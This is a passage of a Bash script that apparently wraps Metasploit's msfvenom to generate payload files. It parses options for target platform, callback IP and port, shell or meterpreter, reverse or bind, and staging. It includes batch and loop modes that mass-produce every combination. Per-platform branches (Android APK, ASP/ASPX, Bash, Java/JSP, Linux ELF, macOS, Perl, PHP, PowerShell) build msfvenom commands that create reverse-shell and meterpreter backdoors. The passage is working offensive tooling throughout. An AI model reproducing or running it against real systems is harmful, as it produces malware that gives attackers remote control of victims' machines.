-d '/' -f1 ) ); done\nfi\n\n## Define TYPEs/FORMATs\nTYPEs=(  apk   asp  aspx  bash  java  linux    osx    perl  php  powershell python  tomcat  windows )   # Due to how its coded, this must always be a higher array count than ${FORMATs}\nFORMATs=(                 sh    jsp   lin elf  macho  pl         ps1        py      war     win exe exe-service dll )\n\n\n## Check user input\n## Able to detect NIC interfaces?\nif [[ -z \"${IFACE}\" ]]; then\n  echo -e \" ${YELLOW}[i]${RESET} Something went wrong. ${RED}Couldn't find any network interfaces${RESET}\" >&2\n  echo -e \" ${YELLOW}[i]${RESET} Need to manually define an IP.   ${YELLOW}${0} --ip <IP>${RESET}\" >&2\n  exit 2\nfi\n\n## Able to detect IP addresses?\nif [[ -z \"${IPs}\" ]]; then\n  echo -e \" ${YELLOW}[i]${RESET} Something went wrong. ${RED}Couldn't discover IP addresses${RESET}. =(\" >&2\n  echo -e \" ${YELLOW}[i]${RESET} Need to manually define it.   ${YELLOW}${0} --ip <IP>${RESET}\" >&2\n  exit 2\nfi\n\n## (!!!Magic Alert!!!) Try to predict what's what with inputs...\nfor x in $( \\tr '[:upper:]' '[:lower:]' <<< \"$@\" ); do\n    if [[ \"${x}\" =~ ^--* ]]; then true                                                                                                        # Long argument? (skip!)\n  elif [[ \"${x}\" == \"list\" || \"${x}\" == \"ls\" || \"${x}\" == \"options\" || \"${x}\" == \"show\" || \"${x}\" == \"help\" ]]; then HELP=true                # List types? (aka help screen)\n  elif [[ \"${x}\" == \"verbose\" || \"${x}\" == \"v\" ]]; then VERBOSE=true                                                                          # Verbose?\n  elif [[ \"${x}\" == \"all\" || \"${x}\" == \"batch\" || \"${x}\" == \"a\" ]]; then BATCH=true                                                           # Batch mode?\n  elif [[ \"${x}\" == \"loop\" || \"${x}\" == \"l\" ]]; then LOOP=true                                                                                # Loop mode?\n  elif [[ \"${x}\" == \"cmd\" || \"${x}\" == \"shell\" || \"${x}\" == \"normal\" ]]; then SHELL=\"shell\"                                                   # Shell?\n  elif [[ \"${x}\" == \"meterpreter\" || \"${x}\" == \"msf\" || \"${x}\" == \"meterp\" ]]; then SHELL=\"meterpreter\"                                       # Meterpreter?\n  elif [[ \"${x}\" == \"bind\" || \"${x}\" ==  \"listen\" ]]; then DIRECTION=\"bind\"                                                                   # Bind payload?\n  elif [[ \"${x}\" == \"reverse\" || \"${x}\" == \"rev\" ]]; then DIRECTION=\"reverse\"                                                                 # Reverse payload? (default)\n  elif [[ \"${x}\" == \"staged\" || \"${x}\" == \"stager\" || \"${x}\" == \"stage\" || \"${x}\" == \"small\" ]]; then STAGE=true                              # Staged?\n  elif [[ \"${x}\" == \"stag\"*\"less\" || \"${x}\" == \"single\" || \"${x}\" == \"inline\" || \"${x}\" == \"no\"* || \"${x}\" == \"full\" ]]; then STAGE=false     # Stageless?\n  elif [[ \"${x}\" == \"https\" || \"${x}\" == \"ssl\" || \"${x}\" == \"tls\" ]]; then METHOD=\"https\"                                                     # HTTPS payload?\n  elif [[ \"${x}\" == \"http\" || \"${x}\" == \"www\" ]]; then METHOD=\"http\"                                                                          # HTTP payload?\n  elif [[ \"${x}\" == \"tcp\" ]]; then METHOD=\"tcp\"                                                                                               # TCP payload? (default)\n  elif [[ \"${x}\" == \"find\"* || \"${x}\" == \"allport\"* ]]; then METHOD=\"find_port\"                                                               # Find_Port payload?\n  elif [[ \"${x}\" =~ ^-?[0-9]+$ && \"${x}\" -gt 1 && \"${x}\" -lt 65535 ]]; then PORT=\"${x}\"                                                       # Port?\n  elif [[ \"${x}\" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then IP=\"${x}\"                                            # IP?\n  elif [[ \"${x}\" == *.* ]]; then IP=\"${x}\"                                                                                                    # Domain/DNS? (weak detection & doesn't support hostname)\n  elif [[ \"${x}\" == \"wan\" && -n \"${WAN}\" ]]; then IP=\"${WAN}\"                                                                                 # WAN interface?\n  else\n    known=false\n    for (( i=0; i<${#IFACE[@]}; ++i )); do [[ \"${x}\" == \"${IFACE[${i}]}\" ]] && IP=\"${IPs[${i}]}\" && known=true && break; done                 # Interface? (rather than a an IP)\n    for (( i=0; i<${#TYPEs[@]}; ++i )); do [[ \"${x}\" == \"${TYPEs[${i}]}\" ]] && TYPE=\"${TYPEs[${i}]}\" && known=true && break; done             # Type?\n    for (( i=0; i<${#FORMATs[@]}; ++i )); do [[ \"${x}\" == \"${FORMATs[${i}]}\" ]] && TYPE=\"${FORMATs[${i}]}\" && known=true && break; done       # Type? (aka formats)\n    [[ \"${known}\" == false ]] \\\n      && echo -e \" ${YELLOW}[i]${RESET} Unable to detect value: ${RED}${x}${RESET}\" \\\n      && exit 1                         # ...if we got this far, we failed. =(\n  fi\ndone\n\n## If the user defined a value, overwrite it regardless\nwhile [[ \"${#}\" -gt 0 && .\"${1}\" == .-* ]]; do\n  opt=\"${1}\";\n  shift;\n  case \"$( echo ${opt} | tr '[:upper:]' '[:lower:]' )\" in\n    -|-- ) break 2;;\n\n    -p|--platform )\n       TYPE=\"${1}\"; shift;;\n    --platform=* )\n       TYPE=\"${opt#*=}\";;\n    -t|--type )\n       TYPE=\"${1}\"; shift;;\n    --type=* )\n       TYPE=\"${opt#*=}\";;\n\n    -i|--ip )\n       IP=\"${1}\"; shift;;\n    --ip=* )\n       IP=\"${opt#*=}\";;\n\n    -p|--port )\n       PORT=\"${1}\"; shift;;\n    --port=* )\n       PORT=\"${opt#*=}\";;\n\n    -m|--msf|--meterpreter )\n       SHELL=\"meterpreter\";;\n    -c|--cmd|--shell )\n       SHELL=\"shell\";;\n    --shell )\n       SHELL=\"${1}\"; shift;;\n    --shell=* )\n       SHELL=\"${opt#*=}\";;\n\n    -b|--bind|--listen )\n       DIRECTION=\"bind\";;\n    -r|--rev|--reverse )\n       DIRECTION=\"reverse\";;\n    --direction )\n       DIRECTION=\"${1}\"; shift;;\n    --direction=* )\n       DIRECTION=\"${opt#*=}\";;\n\n    -s|--staged|--stager )\n       STAGE=true;;\n    --stageless )\n       STAGE=false;;\n    --stage )\n       STAGE=\"${1}\"; shift;;\n    --stage=* )\n       STAGE=\"${opt#*=}\";;\n\n    -t|--tcp )\n       METHOD=\"tcp\";;\n    --http|--www )\n       METHOD=\"http\";;\n    --https|--ssl|--tls )\n       METHOD=\"https\";;\n    -f|--find|--all|--find_port|--find-port|--findport|--allports|--all-ports|--all_ports )\n       METHOD=\"find_port\";;\n    --method )\n       METHOD=\"${1}\"; shift;;\n    --method=* )\n       METHOD=\"${opt#*=}\";;\n\n    -a|--all|--batch )\n       BATCH=true;;\n    -l|--loop )\n       LOOP=true;;\n\n    -v|--verbose )\n       VERBOSE=true;;\n\n    -h|--help|-ls|--list|--options )\n       HELP=true;;\n\n    *) echo -e \" ${YELLOW}[i]${RESET} Invalid option: ${RED}${x}${RESET}\" && exit 1;;\n   esac\ndone\n\n\n## Display help?\n[[ \"${HELP}\" == true ]] \\\n  && doHelp\n\n\n## Check input\n  if [[ \"${SHELL}\" == \"shell\" || \"${SHELL}\" == \"cmd\" || \"${SHELL}\" == \"normal\" ]]; then SHELL=\"shell\"\nelif [[ \"${SHELL}\" == \"meterpreter\" || \"${SHELL}\" == \"msf\" || \"${SHELL}\" == \"meterp\" ]]; then SHELL=\"meterpreter\"; fi\n#else SHELL=\"meterpreter\"; fi   # <--- cant due to batch mode (same with [[ -z \"${SHELL}\" ]])\n\n  if [[ \"${DIRECTION}\" == \"reverse\" || \"${DIRECTION}\" == \"rev\" ]]; then DIRECTION=\"reverse\"\nelif [[ \"${DIRECTION}\" == \"bind\" || \"${DIRECTION}\" == \"listen\" ]]; then DIRECTION=\"bind\"; fi\n\n  if [[ \"${STAGE}\" == \"true\" || \"${STAGE}\" == \"staged\" || \"${STAGE}\" == \"stager\" || \"${STAGE}\" == \"stage\" || \"${STAGE}\" == \"small\" ]]; then STAGE='staged'; _STAGE='/'\nelif [[ \"${STAGE}\" == \"false\" || \"${STAGE}\" == \"stage\"*\"less\" || \"${STAGE}\" == \"single\" || \"${STAGE}\" == \"inline\" || \"${STAGE}\" == \"no\"* || \"${STAGE}\" == \"full\" ]]; then STAGE='stageless'; _STAGE='_'; fi\n\n  if [[ \"${METHOD}\" == \"tcp\" ]]; then METHOD=\"tcp\"\nelif [[ \"${METHOD}\" == \"http\" || \"${METHOD}\" == \"www\" ]]; then METHOD=\"http\"\nelif [[ \"${METHOD}\" == \"https\" || \"${METHOD}\" == \"tls\" || \"${METHOD}\" == \"ssl\" ]]; then METHOD=\"https\"\nelif [[ \"${METHOD}\" == \"find\"* || \"${METHOD}\" == \"all\"* ]]; then METHOD=\"find_port\"; fi\n\n## Did user enter an interface instead of an IP address?\nfor (( x=0; x<${#IFACE[@]}; ++x )); do [[ \"${IP}\" == \"${IFACE[${x}]}\" ]] && IP=${IPs[${x}]} && break; done\n\n## WAN interface?\nif [[ -n \"${WAN}\" && \"${IP}\" == \"${WAN}\" ]]; then\n  [[ \"${VERBOSE}\" == \"true\" ]] \\\n    && echo -e \" ${YELLOW}[i]${RESET} WAN IP: ${YELLOW}${WAN}${RESET}  \"\nfi\n\n## Valued entered for IP address? Is it a valid IPv4 address? Else assume its a domain...\nif [[ \"${IP}\" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then\n  for (( i=1; i<${#BASH_REMATCH[@]}; ++i )); do\n    (( ${BASH_REMATCH[${i}]} <= 255 )) || { echo -e \" ${YELLOW}[i]${RESET} IP (${IP}) appears to be a ${RED}invalid IPv4 address${RESET} =(\" >&2 && exit 3; }\n  done\nelif [[ -n \"${IP}\" ]]; then\n  echo -e \" ${YELLOW}[i]${RESET} ${IP} isn't a IPv4 address. ${YELLOW}Assuming its a domain name${RESET}...\"\n  DOMAIN=true\nfi\n\n## Valid port?\nif [[ \"${PORT}\" -lt 1 || \"${PORT}\" -gt 65535 ]]; then\n  echo -e \" ${YELLOW}[i]${RESET} PORT (${PORT}) is incorrect. Needs to be ${YELLOW}between 1-65535${RESET}\" >&2\n  exit 3\nfi\n\n\n## IP menu\nif [[ -n \"${TYPE}\" && -z \"${IP}\" ]]; then\n  echo -e \"\\n ${YELLOW}[i]${RESET} Use which ${BLUE}interface${RESET} - ${YELLOW}IP address${RESET}?:\"\n  I=0\n  for iface in \"${IFACE[@]}\"; do\n    IPs[${I}]=\"$( \\ifconfig \"${iface}\" | \\grep 'inet ' | \\grep -E '([[:digit:]]{1,2}.){4}' | \\sed -e 's_[:|addr|inet]__g; s_^[ \\t]*__' | \\awk '{print $1}' )\"\n    [[ -z \"${IPs[${I}]}\" ]] \\\n      && IPs[${I}]=\"$( \\ifconfig \"${iface}\" | \\grep 'inet addr:' | \\cut -d':' -f2 | \\cut -d' ' -f1 )\"\n    [[ -z \"${IPs[${I}]}\" ]] \\\n      && IPs[${I}]=\"UNKNOWN\"\n    echo -e \" ${YELLOW}[i]${RESET}   ${GREEN}$[${I}+1]${RESET}.) ${BLUE}${iface}${RESET} - ${YELLOW}${IPs[${I}]}${RESET}\"\n    I=$[${I}+1]\n  done\n  [[ -n \"${WAN}\" ]] \\\n    && I=$[${I}+1] \\\n    && echo -e \" ${YELLOW}[i]${RESET}   ${GREEN}$[${I}]${RESET}.) ${BLUE}wan${RESET} - ${YELLOW}${WAN}${RESET}\"\n  _IP=\"\"\n  while [[ -z \"${_IP}\" ]]; do\n    echo -ne \" ${YELLOW}[?]${RESET} Select ${GREEN}1-${I}${RESET}, ${BLUE}interface${RESET} or ${YELLOW}IP address${RESET}\"; read -p \": \" INPUT\n    for (( x=0; x<${I}; ++x )); do [[ \"${INPUT}\" == \"${IFACE[${x}]}\" ]] && _IP=\"${IPs[${x}]}\"; done           # Did user enter interface?\n    [[ -n \"${WAN}\" && \"${INPUT}\" == \"${INPUT}\" ]] && _IP=\"${WAN}\"                                             # Did user enter wan?\n    [[ \"${INPUT}\" != *\".\"* && \"${INPUT}\" -ge 1 && \"${INPUT}\" -le \"${I}\" ]] && _IP=\"${IPs[${INPUT}-1]}\"        # Did user select number?\n    #for ip in \"${IPs[@]}\"; do [[ \"${INPUT}\" == \"${ip}\" ]] && _IP=\"${ip}\"; done                               # Did user enter a known IP?\n    [[ \"${INPUT}\" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]] && _IP=\"${INPUT}\"         # Did the user enter a IP address (doesn't valid it)\n    IP=\"${_IP}\"\n  done\n  echo \"\"\nfi\n\n\n## Generate #1 (Batch/Looping)\n## Loop mode?\nif [[ \"${LOOP}\" == \"true\" ]]; then\n  echo -e \" ${YELLOW}[i]${RESET} Loop Mode. ${BOLD}Creating one of each TYPE${RESET}, with default values\"\n  [[ \"${VERBOSE}\" == \"true\" ]] \\\n    && _VERBOSE=\"verbose\"\n  for (( i=0; i<${#TYPEs[@]}; ++i )); do\n    echo \"\"   # \"${TYPEs[${i}]}\" \"${IP}\" \"${PORT}\" \"${_VERBOSE}\"\n    eval \"${0}\" \"${TYPEs[${i}]}\" \"${IP}\" \"${PORT}\" \"${_VERBOSE}\"   # chmod +x ${0}\n    echo \"\"\n  done   # for TYPEs[@]\n  echo \"\"\n  eval \"${0}\" \"dll\" \"${IP}\" \"${PORT}\" \"${_VERBOSE}\"   #... the odd one out!\n  echo \"\"\nelif [[ \"${BATCH}\" == \"true\" ]]; then\n  echo -e \" ${YELLOW}[i]${RESET} Batch Mode. ${BOLD}Creating as many different combinations as possible${RESET}\"\n  [[ \"${VERBOSE}\" == \"true\" ]] \\\n    && _VERBOSE=\"verbose\"\n  for (( i=0; i<${#TYPEs[@]}; ++i )); do\n  if [[ -z \"${TYPE}\" || \"${TYPEs[${i}]}\" == \"${TYPE}\" || \"${FORMATs[${i}]}\" == \"${TYPE}\" ]]; then\n    type=\"${TYPEs[${i}]}\"\n    [[ -n \"${TYPE}\" && \"${FORMATs[${i}]}\" == \"${TYPE}\" ]] && type=\"${FORMATs[${i}]}\"\n    for shell in \"meterpreter\" \"shell\"; do\n    if [[ -z \"${SHELL}\" || \"${shell}\" == \"${SHELL}\" ]]; then\n      for direction in \"reverse\" \"bind\"; do\n      if [[ -z \"${DIRECTION}\" || \"${direction}\" == \"${DIRECTION}\" ]]; then\n        for staged in \"staged\" \"stageless\"; do\n        if [[ -z \"${STAGE}\" || \"${staged}\" == \"${STAGE}\" ]]; then\n          for method in \"tcp\" \"http\" \"https\" \"find_port\"; do\n          if [[ -z \"${METHOD}\" || \"${method}\" == \"${METHOD}\" ]]; then\n            echo \"\"   # \"${type}\" \"${IP}\" \"${PORT}\" \"${direction}\" \"${staged}\" \"${method}\"  \"${shell}\" \"${_VERBOSE}\"\n            eval \"${0}\" \"${type}\" \"${IP}\" \"${PORT}\" \"${direction}\" \"${staged}\" \"${method}\"  \"${shell}\" \"${_VERBOSE}\"    # chmod +x ${0}\n            echo \"\"\n          fi        # \"${method}\" == \"${METHOD}\"\n          done      # for protocol\n        fi        # \"${staged}\" == \"${STAGE}\"\n        done      # for staged\n      fi        # \"${direction}\" == \"${DIRECTION}\"\n      done      # for direction\n    fi        # \"${shell}\" == \"${SHELL}\"\n    done      # for shell\n    echo -e \"\\n\"\n  fi        # \"${TYPEs[${i}]}\" == \"${TYPE}\"\n  done      # for TYPEs[@]\nfi\n\n\n## Set default values (after batch/loop)\n[[ -z \"${METHOD}\" ]] \\\n  && METHOD=\"tcp\"\n[[ -z \"${DIRECTION}\" ]] \\\n  && DIRECTION=\"reverse\"\n\n## Valid shell?\nif [[ -n \"${TYPE}\" && \"${SHELL}\" != \"shell\" && \"${SHELL}\" != \"meterpreter\" && -n \"${SHELL}\" ]]; then\n  echo -e \" ${YELLOW}[i]${RESET} SHELL (${SHELL}) is incorrect. Needs to be either ${YELLOW}shell${RESET} or ${YELLOW}meterpreter${RESET}\" >&2\n  exit 3\nfi\n\n## Valid staged?\nif [[ -n \"${TYPE}\" && \"${STAGE}\" != \"staged\" && \"${STAGE}\" != \"stageless\" && -n \"${STAGE}\" ]]; then\n  echo -e \" ${YELLOW}[i]${RESET} STAGED (${STAGE}) is incorrect. Needs to be either ${YELLOW}staged${RESET} or ${YELLOW}stageless${RESET}\" >&2\n  exit 3\nelif [[ -n \"${TYPE}\" && \"${_STAGE}\" != \"/\" && \"${_STAGE}\" != \"_\" && -n \"${STAGE}\" ]]; then    #  \"${STAGE}\" != \"\" is correct\n  echo -e \" ${YELLOW}[i]${RESET} ${RED}Something went wrong (Internally) with stage: ${_STAGE}.${RESET}\"\n  exit 2\nfi\n\n## If its not reverse (bind), the only option is tcp (not http/https/find_ports)\nif [[ \"${DIRECTION}\" != \"reverse\" && \"${METHOD}\" != \"tcp\" ]]; then\n  echo -e \" ${YELLOW}[i]${RESET} Unable to use ${METHOD} with ${DIRECTION}. Please ${YELLOW}switch to reverse${RESET}\" >&2\n  exit 3\nfi\n\n\n## Bind shell does not use LHOST\nLHOST=\"\"\n[[ \"${DIRECTION}\" == \"reverse\" ]] \\\n  && LHOST=\"LHOST=${IP}\"\n\n\n## Generate #2 (Single Payload)\n## APK\nif [[ \"${TYPE}\" == \"apk\" ]]; then\n  [[ -z \"${SHELL}\" ]] \\\n    && SHELL=\"meterpreter\"\n  [[ -z \"${STAGE}\" ]] \\\n    && STAGE=\"stageless\" \\\n    && _STAGE=\"/\"\n  [[ \"${METHOD}\" == \"find_port\" ]] \\\n    && METHOD=\"allports\"\n  TYPE=\"android\"\n  FILEEXT=\"apk\"\n  PAYLOAD=\"android/${SHELL}${_STAGE}${DIRECTION}_${METHOD}\"\n  CMD=\"msfvenom -p ${PAYLOAD} \\\\\\\\\\n  ${LHOST} LPORT=${PORT} \\\\\\\\\\n  > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'\"\n  doAction \"${TYPE}\" \"${IP}\" \"${PORT}\" \"${PAYLOAD}\" \"${CMD}\" \"${FILEEXT}\" \"${SHELL}\" \"${DIRECTION}\" \"${STAGE}\" \"${METHOD}\" \"${VERBOSE}\"\n\n\n## ASP\nelif [[ \"${TYPE}\" == \"asp\" ]]; then\n  [[ -z \"${SHELL}\" ]] \\\n    && SHELL=\"meterpreter\"\n  [[ -z \"${STAGE}\" ]] \\\n    && STAGE=\"staged\" \\\n    && _STAGE=\"/\"\n  [[ \"${METHOD}\" == \"find_port\" ]] \\\n    && METHOD=\"allports\"\n  # Can't do: stageless meterpreter - The EXE generator now has a max size of 2048 bytes, please fix the calling module\n  if [[ \"${STAGE}\" == \"stageless\" && \"${SHELL}\" == \"meterpreter\" ]]; then\n    echo -e \" ${YELLOW}[i]${RESET} Unable to do ${STAGE} ${SHELL} ASP. The result is over Metasploit's ${RED}file size limit${RESET}. =(\" >&2\n    #[[ \"${VERBOSE}\" != 'true' ]] && exit 5   # Force pass the warning?\n  fi\n  TYPE=\"windows\"\n  FILEEXT=\"asp\"\n  PAYLOAD=\"${TYPE}/${SHELL}${_STAGE}${DIRECTION}_${METHOD}\"\n  CMD=\"msfvenom -p ${PAYLOAD} -f ${FILEEXT} \\\\\\\\\\n  --platform ${TYPE} -a x86 -e generic/none ${LHOST} LPORT=${PORT} \\\\\\\\\\n  > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'\"\n  doAction \"${TYPE}\" \"${IP}\" \"${PORT}\" \"${PAYLOAD}\" \"${CMD}\" \"${FILEEXT}\" \"${SHELL}\" \"${DIRECTION}\" \"${STAGE}\" \"${METHOD}\" \"${VERBOSE}\"\n\n## ASPX\nelif [[ \"${TYPE}\" == \"aspx\" ]]; then\n  [[ -z \"${SHELL}\" ]] \\\n    && SHELL=\"meterpreter\"\n  [[ -z \"${STAGE}\" ]] \\\n    && STAGE=\"staged\" \\\n    && _STAGE=\"/\"\n  [[ \"${METHOD}\" == \"find_port\" ]] \\\n    && METHOD=\"allports\"\n  # Its able todo anything that you throw at it =).\n  TYPE=\"windows\"\n  FILEEXT=\"aspx\"\n  PAYLOAD=\"${TYPE}/${SHELL}${_STAGE}${DIRECTION}_${METHOD}\"\n  CMD=\"msfvenom -p ${PAYLOAD} -f ${FILEEXT} \\\\\\\\\\n  --platform ${TYPE} -a x86 -e generic/none ${LHOST} LPORT=${PORT} \\\\\\\\\\n  > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'\"\n  doAction \"${TYPE}\" \"${IP}\" \"${PORT}\" \"${PAYLOAD}\" \"${CMD}\" \"${FILEEXT}\" \"${SHELL}\" \"${DIRECTION}\" \"${STAGE}\" \"${METHOD}\" \"${VERBOSE}\"\n\n## Bash\nelif [[ \"${TYPE}\" == \"bash\" || \"${TYPE}\" == \"sh\" ]]; then\n  [[ -z \"${SHELL}\" ]] \\\n    && SHELL=\"shell\"\n  [[ -z \"${STAGE}\" ]] \\\n    && STAGE=\"staged\" \\\n    && _STAGE=\"/\"\n  # Can't do: meterpreter or stageless - Invalid Payload Selected\n  # Can't do: bind option // http, https or find_port options\n  if [[ \"${STAGE}\" == \"stageless\" ]]; then\n    echo -e \" ${YELLOW}[i]${RESET} Unable to do ${STAGE}. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(\" >&2\n  elif [[ \"${SHELL}\" == \"meterpreter\" ]]; then\n    echo -e \" ${YELLOW}[i]${RESET} Unable to do ${SHELL} Bash. There ${RED}isn't a Bash ${SHELL}${RESET}...yet?\" >&2\n  elif [[ \"${DIRECTION}\" != \"reverse\" ]]; then\n    echo -e \" ${YELLOW}[i]${RESET} Unable to do ${DIRECTION}. There ${RED}isn't a ${DIRECTION} Bash${RESET}...yet?\" >&2\n  fi\n  TYPE=\"bash\"\n  FILEEXT=\"sh\"\n  PAYLOAD=\"cmd/unix${_STAGE}${DIRECTION}_bash\"\n  CMD=\"msfvenom -p ${PAYLOAD} -f raw \\\\\\\\\\n  --platform unix -e generic/none -a cmd ${LHOST} LPORT=${PORT} \\\\\\\\\\n  > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'\"\n  doAction \"${TYPE}\" \"${IP}\" \"${PORT}\" \"${PAYLOAD}\" \"${CMD}\" \"${FILEEXT}\" \"${SHELL}\" \"${DIRECTION}\" \"${STAGE}\" \"${METHOD}\" \"${VERBOSE}\"\n\n## Java\nelif [[ \"${TYPE}\" == \"java\" || \"${TYPE}\" == \"jsp\" ]]; then\n  [[ -z \"${SHELL}\" ]] \\\n    && SHELL=\"meterpreter\"\n  [[ -z \"${STAGE}\" ]] \\\n    && STAGE=\"staged\" \\\n    && _STAGE=\"/\"\n  # Can't do: stageless meterpreter - Invalid Payload Selected\n  if [[ \"${STAGE}\" == \"stageless\" && \"${SHELL}\" == \"meterpreter\" ]]; then\n    echo -e \" ${YELLOW}[i]${RESET} Unable to do ${STAGE} ${SHELL} Java. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(\" >&2\n  fi\n  TYPE=\"java\"\n  FILEEXT=\"jsp\"\n  PAYLOAD=\"${TYPE}/${SHELL}${_STAGE}${DIRECTION}_${METHOD}\"\n  CMD=\"msfvenom -p ${PAYLOAD} -f raw \\\\\\\\\\n  --platform ${TYPE} -e generic/none -a ${TYPE} ${LHOST} LPORT=${PORT} \\\\\\\\\\n  > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'\"\n  doAction \"${TYPE}\" \"${IP}\" \"${PORT}\" \"${PAYLOAD}\" \"${CMD}\" \"${FILEEXT}\" \"${SHELL}\" \"${DIRECTION}\" \"${STAGE}\" \"${METHOD}\" \"${VERBOSE}\"\n\n## Linux\nelif [[ \"${TYPE}\" == \"linux\" || \"${TYPE}\" == \"lin\" || \"${TYPE}\" == \"elf\" ]]; then\n  [[ -z \"${SHELL}\" ]] \\\n    && SHELL=\"shell\"\n  [[ -z \"${STAGE}\" ]] \\\n    && STAGE=\"staged\" \\\n    && _STAGE=\"/\"\n  # Can't do: stageless meterpreter - Invalid Payload Selected\n  if [[ \"${STAGE}\" == \"stageless\" && \"${SHELL}\" == \"meterpreter\" ]]; then\n    echo -e \" ${YELLOW}[i]${RESET} Unable to do ${STAGE} ${SHELL} Linux. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(\" >&2\n  fi\n  TYPE=\"linux\"\n  FILEEXT=\"elf\"    #bin\n  PAYLOAD=\"${TYPE}/x86/${SHELL}${_STAGE}${DIRECTION}_${METHOD}\"\n  CMD=\"msfvenom -p ${PAYLOAD} -f ${FILEEXT} \\\\\\\\\\n  --platform ${TYPE} -a x86 -e generic/none ${LHOST} LPORT=${PORT} \\\\\\\\\\n  > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'\"\n  doAction \"${TYPE}\" \"${IP}\" \"${PORT}\" \"${PAYLOAD}\" \"${CMD}\" \"${FILEEXT}\" \"${SHELL}\" \"${DIRECTION}\" \"${STAGE}\" \"${METHOD}\" \"${VERBOSE}\"\n\n## OSX\nelif [[ \"${TYPE}\" == \"osx\" || \"${TYPE}\" == \"macho\" ]]; then\n  [[ -z \"${SHELL}\" ]] \\\n    && SHELL=\"shell\"\n  [[ -z \"${STAGE}\" ]] \\\n    && STAGE=\"stageless\" \\\n    && _STAGE=\"_\"\n  # Can't do: meterpreter or stageless - Invalid Payload Selected\n  if [[ \"${STAGE}\" == \"staged\" ]]; then\n    echo -e \" ${YELLOW}[i]${RESET} Unable to do ${STAGE} OSX. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(\" >&2\n  elif [[ \"${SHELL}\" == \"meterpreter\" ]]; then\n    echo -e \" ${YELLOW}[i]${RESET} Unable to do ${SHELL} OSX. There ${RED}isn't a OSX Meterpreter${RESET}...yet.\" >&2\n  fi\n  TYPE=\"osx\"\n  FILEEXT=\"macho\"\n  PAYLOAD=\"osx/x86/${SHELL}${_STAGE}${DIRECTION}_${METHOD}\"\n  CMD=\"msfvenom -p ${PAYLOAD} -f ${FILEEXT} \\\\\\\\\\n  --platform ${TYPE} -a x86 -e generic/none ${LHOST} LPORT=${PORT} \\\\\\\\\\n  > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'\"\n  doAction \"${TYPE}\" \"${IP}\" \"${PORT}\" \"${PAYLOAD}\" \"${CMD}\" \"${FILEEXT}\" \"${SHELL}\" \"${DIRECTION}\" \"${STAGE}\" \"${METHOD}\" \"${VERBOSE}\"\n\n## Perl\nelif [[ \"${TYPE}\" == \"perl\" || \"${TYPE}\" == \"pl\" ]]; then\n  [[ -z \"${SHELL}\" ]] \\\n    && SHELL=\"shell\"\n  [[ -z \"${STAGE}\" ]] \\\n    && STAGE=\"staged\" \\\n    && _STAGE=\"/\"\n  # Can't do: meterpreter or stageless - Invalid Payload Selected\n  if [[ \"${STAGE}\" == \"stageless\" ]]; then\n    echo -e \" ${YELLOW}[i]${RESET} Unable to do ${STAGE} PERL. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(\" >&2\n  elif [[ \"${SHELL}\" == \"meterpreter\" ]]; then\n    echo -e \" ${YELLOW}[i]${RESET} Unable to do ${SHELL} PERL. There ${RED}isn't a PERL Meterpreter${RESET}...yet.\" >&2\n  fi\n  TYPE=\"linux\"\n  FILEEXT=\"pl\"\n  PAYLOAD=\"cmd/unix${_STAGE}${DIRECTION}_perl\"\n  CMD=\"msfvenom -p ${PAYLOAD} -f ${FILEEXT} \\\\\\\\\\n  --platform unix -a cmd -e generic/none ${LHOST} LPORT=${PORT} \\\\\\\\\\n  > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'\"\n  doAction \"${TYPE}\" \"${IP}\" \"${PORT}\" \"${PAYLOAD}\" \"${CMD}\" \"${FILEEXT}\" \"${SHELL}\" \"${DIRECTION}\" \"${STAGE}\" \"${METHOD}\" \"${VERBOSE}\"\n\n## PHP\nelif [[ \"${TYPE}\" == \"php\" ]]; then\n  [[ -z \"${SHELL}\" ]] \\\n    && SHELL=\"meterpreter\"\n  [[ -z \"${STAGE}\" ]] \\\n    && STAGE=\"staged\" \\\n    && _STAGE=\"/\"\n  # Can't do: shell - Invalid Payload Selected\n  if [[ \"${SHELL}\" == \"shell\" ]]; then\n    echo -e \" ${YELLOW}[i]${RESET} Unable to do ${SHELL} PHP. There ${RED}isn't a option in Metasploit to allow it${RESET}. =(\" >&2\n  fi\n  TYPE=\"php\"\n  FILEEXT=\"php\"\n  PAYLOAD=\"${TYPE}/${SHELL}${_STAGE}${DIRECTION}_${METHOD}\"\n  CMD=\"msfvenom -p ${PAYLOAD} -f raw \\\\\\\\\\n  --platform ${TYPE} -e generic/none -a ${TYPE} ${LHOST} LPORT=${PORT} \\\\\\\\\\n  > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'\"\n  doAction \"${TYPE}\" \"${IP}\" \"${PORT}\" \"${PAYLOAD}\" \"${CMD}\" \"${FILEEXT}\" \"${SHELL}\" \"${DIRECTION}\" \"${STAGE}\" \"${METHOD}\" \"${VERBOSE}\"\n\n## Powershell\nelif [[ \"${TYPE}\" == \"powershell\" || \"${TYPE}\" == \"ps1\" ]]; then\n  [[ -z \"${SHELL}\" ]] \\\n    && SHELL=\"meterpreter\"\n  [[ -z \"${STAGE}\" ]] \\\n    && STAGE=\"stageless\" \\\n    && _STAGE=\"_\"\n 